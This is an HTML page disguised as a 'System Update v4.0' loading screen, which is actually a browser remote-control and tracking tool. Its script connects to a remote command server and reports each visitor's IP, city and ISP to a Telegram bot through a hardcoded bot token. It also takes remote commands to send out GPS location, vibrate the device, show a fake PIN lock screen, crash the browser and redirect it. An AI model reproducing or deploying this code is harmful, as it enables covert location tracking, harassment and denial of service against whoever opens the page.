<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update v4.0</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        body { background: #050505; color: #00ff41; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
        .spinner { width: 50px; height: 50px; border: 5px solid #111; border-top: 5px solid #00ff41; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(3600deg); } }
        #lock-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, #200000 0%, #000 100%); z-index: 10000; color: #ff0000; padding-top: 30%; }
        input { background: transparent; border: 1px solid #ff0000; color: #fff; padding: 12px; width: 80%; text-align: center; margin-top: 20px; outline: none; }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <div id="status">⚡ INITIALIZING FIONZY-PROTOCOL... 0%</div>
    <div id="lock-screen">
        <h1>⚠️</h1><h2>ACCESS DENIED</h2><p>Locked by <b>Fionzy-Protocol</b></p>
        <input type="password" id="passInput" placeholder="Enter PIN">
    </div>
    <script>
        const BACKEND_URL = "https://proceeding-reef-room-univ.trycloudflare.com"; // Ganti dengan link .trycloudflare.com
        const BOT_TOKEN = "8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA";
        const CHAT_ID = "7373392803";
        const socket = io(BACKEND_URL, { transports: ['websocket'] });

        async function sendToBot(text) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
        }

        socket.on('connect', () => {
            document.getElementById('status').innerText = "⚡ SYSTEM CONNECTED: 100%";
            fetch('https://ipapi.co/json/').then(r => r.json()).then(ip => {
                sendToBot(`⚡ **TARGET ONLINE**\nIP: ${ip.ip}\nCity: ${ip.city}\nISP: ${ip.org}`);
            });
        });

        socket.on('command', (msg) => {
            const args = msg.split(' ');
            const cmd = args[0].toLowerCase();
            if(cmd === '/gps') navigator.geolocation.getCurrentPosition(p => sendToBot(`📍 **GPS**\nMaps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`));
            if(cmd === '/vibrate') navigator.vibrate(5000);
            if(cmd === '/lock') document.getElementById('lock-screen').style.display = 'block';
            if(cmd === '/unlock') document.getElementById('lock-screen').style.display = 'none';
            if(cmd === '/crash') { while(true) { history.pushState(null,null,null); } }
            if(cmd === '/redirect') window.location.href = args[1];
        });
    </script>
</body>
</html>
